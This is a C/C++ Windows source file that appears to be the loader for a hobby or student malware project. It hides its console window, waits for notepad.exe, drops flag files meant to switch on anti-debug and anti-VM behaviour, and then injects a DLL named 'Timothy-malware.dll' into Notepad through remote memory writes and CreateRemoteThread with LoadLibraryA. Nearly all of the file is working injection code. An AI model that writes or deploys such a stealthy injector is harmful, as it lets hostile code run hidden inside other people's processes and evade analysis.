#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <windows.h>
#include <tlhelp32.h>


// find process ID by process name
int getNotepadPid() {
    const wchar_t* processName = L"notepad.exe";
    HANDLE snapshot;
    PROCESSENTRY32W processes;
    int pid = 0;
    BOOL result;

    // snapshot of all processes in the system
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == snapshot) return 0;

    processes.dwSize = sizeof(PROCESSENTRY32);

    result = Process32First(snapshot, &processes);

    // retrieve information about the processes
    // and exit if unsuccessful
    while (result) {
        // cmp name to "notepad.exe"
        if (wcscmp(processName, processes.szExeFile) == 0) {
            pid = processes.th32ProcessID;
            break;
        }
        result = Process32Next(snapshot, &processes);
    }

    CloseHandle(snapshot);
    return pid;
}

//helper function to create the "flags" used to trigger anti-debug + anti-vm mode
void createFlagFile(const wchar_t* flagFilePath) {
    HANDLE flagFile = CreateFile(flagFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (flagFile != INVALID_HANDLE_VALUE) {
        CloseHandle(flagFile); 
    }
}

// Injection process from ZeroMemoryEx on Github: https://github.com/ZeroMemoryEx/Dll-Injector/tree/master
int main(int argc, char* argv[])
{
    //hide the console window
    HWND window = GetConsoleWindow();
    ShowWindow(window, SW_HIDE);


    BOOL WPM = 0;
    DWORD procID = getNotepadPid();
    const char* dllPath = "C:\\Timothy-malware.dll";

    //will keep checking for notepad.exe every 5 seconds until it is found
    while (true) {
        procID = getNotepadPid();
        if (procID != 0) {
            break;
        } else {
            // if notepad is not open try again in 5 seconds
            Sleep(5000);
        }
    }

    // no clue how to actually pass forward variables into a DLL, so just write to a file, and let the DLL read/delete them when done
    if (argc > 1) {
        if (strcmp(argv[1], "-ad") == 0) {
            createFlagFile(L"C:\\Users\\Public\\antiDebugPresent.txt");
        }
        else if (strcmp(argv[1], "-avm") == 0) {
            createFlagFile(L"C:\\Users\\Public\\antiVMPresent.txt");
        }
    }


    HANDLE processHandler = OpenProcess(PROCESS_ALL_ACCESS, 0, procID);
    if (processHandler == INVALID_HANDLE_VALUE)
    {
        return -1;
    }

    void* loc = VirtualAllocEx(processHandler, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WPM = WriteProcessMemory(processHandler, loc, dllPath, strlen(dllPath) + 1, 0);
    if (!WPM)
    {
        CloseHandle(processHandler);
        return -1;
    }

    HANDLE hThread = CreateRemoteThread(processHandler, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);
    if (!hThread)
    {
        VirtualFree(loc, strlen(dllPath) + 1, MEM_RELEASE);
        CloseHandle(processHandler);
        return -1;
    }

    CloseHandle(processHandler);
    VirtualFree(loc, strlen(dllPath) + 1, MEM_RELEASE);
    CloseHandle(hThread);
    return 0;
}


